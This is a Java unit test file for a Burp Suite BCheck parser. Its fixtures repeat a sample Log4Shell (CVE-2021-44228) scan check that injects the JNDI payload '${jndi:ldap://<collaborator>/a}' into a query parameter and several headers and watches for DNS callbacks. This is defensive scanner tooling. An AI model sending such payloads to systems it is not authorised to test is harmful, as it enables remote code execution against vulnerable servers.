package data;

import data.bcheck.BCheck;
import data.bcheck.BCheckFactory;
import logging.Logger;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.nio.file.Path;

import static java.nio.file.Files.writeString;
import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatIllegalArgumentException;
import static org.mockito.Mockito.mock;

class BCheckFactoryTest {
    private final Logger logger = mock(Logger.class);
    private final BCheckFactory bCheckFactory = new BCheckFactory(logger);

    @TempDir
    private Path directory;

    @Test
    void givenNonExistentBCheckFile_whenTryToParse_thenExceptionThrown() {
        assertThatIllegalArgumentException().isThrownBy(() -> bCheckFactory.fromFile(Path.of("hi")));
    }

    @Test
    void givenFolderInsteadOfFile_whenTryToParse_thenExceptionThrown() {
        assertThatIllegalArgumentException().isThrownBy(() -> bCheckFactory.fromFile(directory));
    }

    @Test
    void givenBCheckFileWithAllAttributes_whenParse_thenCorrectlyParsedBCheckObjectReturned() throws IOException {
        String fileName = "bcheck.bcheck";
        Path saveLocation = directory.resolve(fileName);
        String contents = """
                metadata:
                    language: v1-beta
                    name: "Log4Shell (collaborator)"
                    description: "Tests for the Log4Shell vulnerability"
                    author: "Carlos Montoya"
                    tags: "log4Shell", "CVE-2021-44228", "cve"
                                
                define:
                    log4shell = `$\\{jndi:ldap://{generate_collaborator_address()}/a}`
                    not4shell = `$\\{jmdi:lxap://{generate_collaborator_address()}/a}`
                    issueDetail = `The collaborator payload {log4shell} was added to a query parameter and several headers. This resulted in an interaction with the Burp collaborator.`
                    issueRemediation = "Make sure you are up to date with patches and follow the remediation for CVE-2021-44228."
                                
                given request then
                    send request:
                        method: "GET"
                        appending queries: `x={log4shell}`
                        replacing headers:
                              "Cookie": `{log4shell}={log4shell}`,
                              "Location": {log4shell},
                              "Origin": {log4shell},
                              "Referer": {log4shell}
                                
                    if dns interactions then
                        # perform a follow up to reduce false positives
                        send request:
                            method: "GET"
                            appending queries: `x={not4shell}`
                            replacing headers:
                                  "Cookie": `{not4shell}={not4shell}`,
                                  "Location": {not4shell},
                                  "Origin": {not4shell},
                                  "Referer": {not4shell}
                                
                        if not(dns interactions) then
                            report issue:
                                severity: high
                                confidence: firm
                                detail: {issueDetail}
                                remediation: {issueRemediation}
                        end if
                    end if
                """;

        writeString(saveLocation, contents);

        BCheck bCheck = bCheckFactory.fromFile(saveLocation);

        assertThat(bCheck.name()).isEqualTo("Log4Shell (collaborator)");
        assertThat(bCheck.author()).isEqualTo("Carlos Montoya");
        assertThat(bCheck.description()).isEqualTo("Tests for the Log4Shell vulnerability");
        assertThat(bCheck.tags().tags()).containsExactly("log4shell", "cve-2021-44228", "cve");
        assertThat(bCheck.path()).isEqualTo(saveLocation.toString());
        assertThat(bCheck.filename()).isEqualTo(fileName);
        assertThat(bCheck.content()).isEqualTo(contents);
    }

    @Test
    void givenBCheckFileWithMissingAndMalformedAttributes_whenParse_thenCorrectlyParsedBCheckObjectReturned() throws IOException {
        String fileName = "bcheck.bcheck";
        Path saveLocation = directory.resolve(fileName);
        String contents = """
                metadata:
                    language: v1-beta
                    name:""
                    description: "
                    author:
                                
                define:
                    log4shell = `$\\{jndi:ldap://{generate_collaborator_address()}/a}`
                    not4shell = `$\\{jmdi:lxap://{generate_collaborator_address()}/a}`
                    issueDetail = `The collaborator payload {log4shell} was added to a query parameter and several headers. This resulted in an interaction with the Burp collaborator.`
                    issueRemediation = "Make sure you are up to date with patches and follow the remediation for CVE-2021-44228."
                                
                given request then
                    send request:
                        method: "GET"
                        appending queries: `x={log4shell}`
                        replacing headers:
                              "Cookie": `{log4shell}={log4shell}`,
                              "Location": {log4shell},
                              "Origin": {log4shell},
                              "Referer": {log4shell}
                                
                    if dns interactions then
                        # perform a follow up to reduce false positives
                        send request:
                            method: "GET"
                            appending queries: `x={not4shell}`
                            replacing headers:
                                  "Cookie": `{not4shell}={not4shell}`,
                                  "Location": {not4shell},
                                  "Origin": {not4shell},
                                  "Referer": {not4shell}
                                
                        if not(dns interactions) then
                            report issue:
                                severity: high
                                confidence: firm
                                detail: {issueDetail}
                                remediation: {issueRemediation}
                        end if
                    end if
                """;

        writeString(saveLocation, contents);

        BCheck bCheck = bCheckFactory.fromFile(saveLocation);

        assertThat(bCheck.name()).isEqualTo("No name");
        assertThat(bCheck.author()).isEqualTo("No author");
        assertThat(bCheck.description()).isEqualTo("No description");
        assertThat(bCheck.tags().tags()).isEmpty();
        assertThat(bCheck.path()).isEqualTo(saveLocation.toString());
        assertThat(bCheck.filename()).isEqualTo(fileName);
        assertThat(bCheck.content()).isEqualTo(contents);
    }

    @Test
    void givenBCheckFileWithOneLongTagString_whenParse_thenCorrectlyParsedBCheckObjectReturned() throws IOException {
        String fileName = "bcheck.bcheck";
        Path saveLocation = directory.resolve(fileName);
        String contents = """
                metadata:
                    language: v1-beta
                    name: "Log4Shell (collaborator)"
                    description: "Tests for the Log4Shell vulnerability"
                    author: "Carlos Montoya"
                    tags: "log4Shell,CVE-2021-44228,cve"
                                
                define:
                    log4shell = `$\\{jndi:ldap://{generate_collaborator_address()}/a}`
                    not4shell = `$\\{jmdi:lxap://{generate_collaborator_address()}/a}`
                    issueDetail = `The collaborator payload {log4shell} was added to a query parameter and several headers. This resulted in an interaction with the Burp collaborator.`
                    issueRemediation = "Make sure you are up to date with patches and follow the remediation for CVE-2021-44228."
                                
                given request then
                    send request:
                        method: "GET"
                        appending queries: `x={log4shell}`
                        replacing headers:
                              "Cookie": `{log4shell}={log4shell}`,
                              "Location": {log4shell},
                              "Origin": {log4shell},
                              "Referer": {log4shell}
                                
                    if dns interactions then
                        # perform a follow up to reduce false positives
                        send request:
                            method: "GET"
                            appending queries: `x={not4shell}`
                            replacing headers:
                                  "Cookie": `{not4shell}={not4shell}`,
                                  "Location": {not4shell},
                                  "Origin": {not4shell},
                                  "Referer": {not4shell}
                                
                        if not(dns interactions) then
                            report issue:
                                severity: high
                                confidence: firm
                                detail: {issueDetail}
                                remediation: {issueRemediation}
                        end if
                    end if
                """;

        writeString(saveLocation, contents);

        BCheck bCheck = bCheckFactory.fromFile(saveLocation);

        assertThat(bCheck.name()).isEqualTo("Log4Shell (collaborator)");
        assertThat(bCheck.author()).isEqualTo("Carlos Montoya");
        assertThat(bCheck.description()).isEqualTo("Tests for the Log4Shell vulnerability");
        assertThat(bCheck.tags().tags()).containsExactly("log4shell", "cve-2021-44228", "cve");
        assertThat(bCheck.path()).isEqualTo(saveLocation.toString());
        assertThat(bCheck.filename()).isEqualTo(fileName);
        assertThat(bCheck.content()).isEqualTo(contents);
    }
}